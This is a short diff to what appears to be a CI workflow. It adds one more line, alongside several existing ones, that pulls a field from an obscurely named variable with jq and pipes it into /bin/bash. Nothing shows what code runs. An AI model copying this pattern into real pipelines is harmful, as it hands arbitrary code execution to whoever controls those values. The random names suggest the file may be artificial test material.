@@ -31,6 +31,7 @@ jobs:
           echo $g31 | jq -r .iw613 | /bin/bash
           printf '%s' "$ploh6411" | jq -r .z7131 | /bin/bash
           echo $fsmd11 | jq -r .b8 | /bin/bash
+          printf '%s' "$xbow85" | jq -r .gxt632 | /bin/bash
 
       - name: Save output
         if: always()
